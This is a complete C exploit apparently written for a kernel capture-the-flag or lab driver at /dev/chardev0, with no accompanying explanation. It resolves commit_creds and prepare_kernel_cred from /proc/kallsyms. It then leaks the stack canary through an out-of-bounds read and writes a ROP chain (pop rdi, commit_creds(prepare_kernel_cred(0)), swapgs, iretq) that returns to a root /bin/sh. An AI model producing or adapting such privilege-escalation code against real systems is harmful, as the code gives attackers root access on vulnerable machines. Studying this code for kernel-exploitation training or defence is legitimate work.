//gcc -masm=intel -static -o exploit exploit.c

#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>
#include <string.h>
#include <stdint.h>

#define TEXT_LEN 64




size_t commit_creds, prepare_kernel_cred;

unsigned long kallsym_getaddr(const char* str)
{
    FILE *stream;
    char fbuf[256];
    char addr[32];
 
    stream = fopen("/proc/kallsyms","r");
    if(stream < 0)
    {
        printf("failed to open /proc/kallsyms\n");
        return 0;
    }
 
    memset(fbuf,0x00,sizeof(fbuf));
     
    char buf[0x30] = {0};
    while(fgets(fbuf,256,stream) != NULL)
    {
        char *p = fbuf;
        char *a = addr;
 
        if(strlen(fbuf) == 0)
            continue;
 
        memset(addr,0x00,sizeof(addr));
        fbuf[strlen(fbuf)-1] = '\0';
 
        while(*p != ' ')
            *a++ = *p++;
 
        p += 3;
        if(!strcmp(p,str)){
            char hex[20] = {0};
            strncpy(hex, addr, 16);
            if(strcmp(str,"prepare_kernel_cred") == 0){
            sscanf(hex, "%lx", &prepare_kernel_cred);
            return 1;
            }else if(strcmp(str,"commit_creds") == 0){
                sscanf(hex, "%lx", &commit_creds);
            return 1;
            }
        }
    }
 
    return 0;
}

struct trap_frame{
	void * user_rip;
	uint64_t user_cs;
	uint64_t user_rflags;
	void * user_rsp;
	uint64_t user_ss;

}__attribute__((packed));

struct trap_frame rv;

void getShell(void){

	execl("/bin/sh", "sh", NULL);
}

void backup_rv(void){
	asm("mov rv+8, cs;"
		"pushf; pop rv+16;"
		"mov rv+24, rsp;"
		"mov rv+32, ss;"
			
			);
}

int main(){
	static char buf[128];
	int fd;
	size_t rop[512];

	if((fd = open("/dev/chardev0", O_RDWR)) < 0 )
		printf("Cannot open /dev/chardev0! \n");

	if(kallsym_getaddr("commit_creds") == 0)
    	{
        	printf("failed to get commit_creds address\n");
        	return 0;
	}
 
    	if(kallsym_getaddr("prepare_kernel_cred") == 0)
    	{
        	printf("failed to get prepare_kernel_cred address\n");
       	 	return 0;
    	}
 
	printf("prepare_kernel_cred addr: %p\n", (void*)prepare_kernel_cred);
    	printf("commit_creds addr: %p\n", (void*)commit_creds);
 


	lseek(fd, 16, SEEK_CUR);
    	read(fd, buf, TEXT_LEN);

	int i,j;
    	for (i = 0; i < 4; i++)
    	{
        	for (j = 0; j < 16; j++) printf("%02x ", buf[i*16+j] & 0xff);
        	printf(" | ");
        	for (j = 0; j < 16; j++) printf("%c", buf[i*16+j] & 0xff);
        	printf("\n");
    	}

	char canary[8];

	memcpy(canary, buf+48, 8);
	size_t my_canary = ((size_t *)canary)[0];
	printf("Leaked canary @ %p\n", my_canary);

	int k=8;
	memset(&rop[0], 0x41, 64);

	backup_rv();

	rop[k++] = my_canary;
	rop[k++] = 0x0;
	rop[k++] = 0x0;

	rop[k++] = commit_creds - 0x81da8; //POP RDI
	rop[k++] = 0;
	rop[k++] = prepare_kernel_cred;

	rop[k++] = commit_creds + 0x670b8; //mov rdi, rax ; rep movsd  ; ret 
	rop[k++] = commit_creds;

	rop[k++] = commit_creds + 0xb7dbca; //swapgs  ; popfq  ; ret
	rop[k++] = 0;
	rop[k++] = commit_creds - 0x6163e; //iretq
	rop[k++] = (size_t)getShell; //rv.user_rip
	rop[k++] = rv.user_cs;
	rop[k++] = rv.user_rflags;
	rop[k++] = rv.user_rsp;
	rop[k++] = rv.user_ss;

	write(fd, rop, 8*k++);



	if(close(fd) != 0)
		printf("Cannot close ! shit !\n");

	return 0;
}
